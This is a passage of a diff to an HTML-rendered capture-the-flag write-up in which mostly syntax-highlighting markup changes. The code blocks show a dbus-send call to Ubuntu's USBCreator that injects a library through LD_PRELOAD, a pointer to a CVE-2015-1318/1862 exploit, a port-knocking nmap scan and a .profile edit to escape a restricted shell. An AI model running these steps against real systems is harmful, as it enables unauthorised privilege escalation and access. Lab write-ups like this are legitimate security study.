-&lt;span class="nv"&gt;Error&lt;/span&gt; &lt;span class="nv"&gt;org&lt;/span&gt;.&lt;span class="nv"&gt;freedesktop&lt;/span&gt;.&lt;span class="nv"&gt;DBus&lt;/span&gt;.&lt;span class="nv"&gt;Error&lt;/span&gt;.&lt;span class="nv"&gt;ServiceUnknown&lt;/span&gt;: &lt;span class="nv"&gt;The&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt; &lt;span class="nv"&gt;com&lt;/span&gt;.&lt;span class="nv"&gt;ubuntu&lt;/span&gt;.&lt;span class="nv"&gt;USBCreator&lt;/span&gt; &lt;span class="nv"&gt;was&lt;/span&gt; &lt;span class="nv"&gt;not&lt;/span&gt; &lt;span class="nv"&gt;provided&lt;/span&gt; &lt;span class="nv"&gt;by&lt;/span&gt; &lt;span class="nv"&gt;any&lt;/span&gt; .&lt;span class="nv"&gt;service&lt;/span&gt; &lt;span class="nv"&gt;files&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;dbus&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;send&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;print&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;reply&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;system&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;com&lt;/span&gt;.&lt;span class="nv"&gt;ubuntu&lt;/span&gt;.&lt;span class="nv"&gt;USBCreator&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;ubuntu&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;USBCreator&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;com&lt;/span&gt;.&lt;span class="nv"&gt;ubuntu&lt;/span&gt;.&lt;span class="nv"&gt;USBCreator&lt;/span&gt;.&lt;span class="nv"&gt;KVMTest&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;string&lt;/span&gt;:&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;sda&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;dict&lt;/span&gt;:&lt;span class="nv"&gt;string&lt;/span&gt;:&lt;span class="nv"&gt;string&lt;/span&gt;:&lt;span class="nv"&gt;DISPLAY&lt;/span&gt;,&lt;span class="s2"&gt;"foo"&lt;/span&gt;,&lt;span class="nv"&gt;XAUTHORITY&lt;/span&gt;,&lt;span class="s2"&gt;"foo"&lt;/span&gt;,&lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;,&lt;span class="s2"&gt;"/tmp/test.so"&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="nv"&gt;Error&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;org&lt;/span&gt;.&lt;span class="nv"&gt;freedesktop&lt;/span&gt;.&lt;span class="nv"&gt;DBus&lt;/span&gt;.&lt;span class="nv"&gt;Error&lt;/span&gt;.&lt;span class="nv"&gt;ServiceUnknown&lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;com&lt;/span&gt;.&lt;span class="nv"&gt;ubuntu&lt;/span&gt;.&lt;span class="nv"&gt;USBCreator&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;was&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;provided&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;by&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;any&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;.&lt;span class="nv"&gt;service&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;files&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3&gt;CVE-2015-1318 + CVE-2015-1862&lt;/h3&gt;
 &lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/36746/"&gt;The CVE-2015-1318 + CVE-2015-1862&lt;/a&gt;
@@ -21562,16 +21946,16 @@ the sequence ports extract from the pcap file (it is quite simple to read with
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;A &lt;a href="http://nmap.org/"&gt;nmap&lt;/a&gt; scan is launched after the knocking sequence to see
 what port will open:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;Starting&lt;/span&gt; &lt;span class="nv"&gt;Nmap&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;.&lt;span class="mi"&gt;47&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt; &lt;span class="nv"&gt;http&lt;/span&gt;:&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nv"&gt;nmap&lt;/span&gt;.&lt;span class="nv"&gt;org&lt;/span&gt; &lt;span class="ss"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;at&lt;/span&gt; &lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;04&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;:&lt;span class="mi"&gt;35&lt;/span&gt; &lt;span class="nv"&gt;CEST&lt;/span&gt;
-&lt;span class="nv"&gt;Nmap&lt;/span&gt; &lt;span class="nv"&gt;scan&lt;/span&gt; &lt;span class="nv"&gt;report&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;.&lt;span class="mi"&gt;0&lt;/span&gt;.&lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;6&lt;/span&gt;
-&lt;span class="nv"&gt;Host&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;up&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;.&lt;span class="mi"&gt;00060&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt; &lt;span class="nv"&gt;latency&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;.
-&lt;span class="nv"&gt;Not&lt;/span&gt; &lt;span class="nv"&gt;shown&lt;/span&gt;: &lt;span class="mi"&gt;998&lt;/span&gt; &lt;span class="nv"&gt;closed&lt;/span&gt; &lt;span class="nv"&gt;ports&lt;/span&gt;
-&lt;span class="nv"&gt;PORT&lt;/span&gt;     &lt;span class="nv"&gt;STATE&lt;/span&gt; &lt;span class="nv"&gt;SERVICE&lt;/span&gt;         &lt;span class="nv"&gt;VERSION&lt;/span&gt;
-&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;tcp&lt;/span&gt;   &lt;span class="nv"&gt;open&lt;/span&gt;  &lt;span class="nv"&gt;http&lt;/span&gt;            &lt;span class="nv"&gt;Apache&lt;/span&gt; &lt;span class="nv"&gt;httpd&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;4&lt;/span&gt;.&lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="ss"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;Ubuntu&lt;/span&gt;&lt;span class="ss"&gt;))&lt;/span&gt;
-&lt;span class="mi"&gt;8888&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;tcp&lt;/span&gt; &lt;span class="nv"&gt;open&lt;/span&gt;  &lt;span class="nv"&gt;sun&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;answerbook&lt;/span&gt;?
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;Starting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;.&lt;span class="mi"&gt;47&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;http&lt;/span&gt;:&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nv"&gt;nmap&lt;/span&gt;.&lt;span class="nv"&gt;org&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;04&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;:&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;CEST&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="nv"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;.&lt;span class="mi"&gt;0&lt;/span&gt;.&lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="nv"&gt;Host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;.&lt;span class="mi"&gt;00060&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;latency&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;.&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="nv"&gt;Not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;shown&lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;998&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;closed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;ports&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="nv"&gt;PORT&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nv"&gt;STATE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;SERVICE&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="nv"&gt;VERSION&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nv"&gt;open&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nv"&gt;http&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nv"&gt;Apache&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;httpd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;4&lt;/span&gt;.&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;Ubuntu&lt;/span&gt;&lt;span class="ss"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="mi"&gt;8888&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;open&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nv"&gt;sun&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;answerbook&lt;/span&gt;?&lt;span class="w"&gt;&lt;/span&gt;
 
-&lt;span class="nv"&gt;Service&lt;/span&gt; &lt;span class="nv"&gt;detection&lt;/span&gt; &lt;span class="nv"&gt;performed&lt;/span&gt;. &lt;span class="nv"&gt;Please&lt;/span&gt; &lt;span class="nv"&gt;report&lt;/span&gt; &lt;span class="nv"&gt;any&lt;/span&gt; &lt;span class="nv"&gt;incorrect&lt;/span&gt; &lt;span class="nv"&gt;results&lt;/span&gt; &lt;span class="nv"&gt;at&lt;/span&gt; &lt;span class="nv"&gt;http&lt;/span&gt;:&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nv"&gt;nmap&lt;/span&gt;.&lt;span class="nv"&gt;org&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;submit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; .
-&lt;span class="nv"&gt;Nmap&lt;/span&gt; &lt;span class="nv"&gt;done&lt;/span&gt;: &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;IP&lt;/span&gt; &lt;span class="nv"&gt;address&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;host&lt;/span&gt; &lt;span class="nv"&gt;up&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;scanned&lt;/span&gt; &lt;span class="nv"&gt;in&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;.&lt;span class="mi"&gt;43&lt;/span&gt; &lt;span class="nv"&gt;seconds&lt;/span&gt;
+&lt;span class="nv"&gt;Service&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;detection&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;performed&lt;/span&gt;.&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Please&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;any&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;incorrect&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;results&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;http&lt;/span&gt;:&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nv"&gt;nmap&lt;/span&gt;.&lt;span class="nv"&gt;org&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;submit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;.&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="nv"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;done&lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;IP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;address&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;up&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;scanned&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;.&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;seconds&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;This port run an other HTTP service which give us a second url &lt;code&gt;/burgerworld&lt;/code&gt;
 and a second pcap file.&lt;/p&gt;
@@ -21666,7 +22050,7 @@ bruteforce. I do not like bruteforce, so I continue looking for something else.&
 &lt;p&gt;This part was the hardest of this challenge. It take me three weeks (not at full
 time of course) to get over with it. I will give you some of my guessing steps:&lt;/p&gt;
 &lt;p&gt;First of all to get a shell we just need to modify the &lt;code&gt;.profil&lt;/code&gt; file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;sed&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;s/exit//&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; .&lt;span class="nv"&gt;profile&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;sed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'s/exit//'&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;.&lt;span class="nv"&gt;profile&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Let see what there is in beavis' home:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls /home/beavis
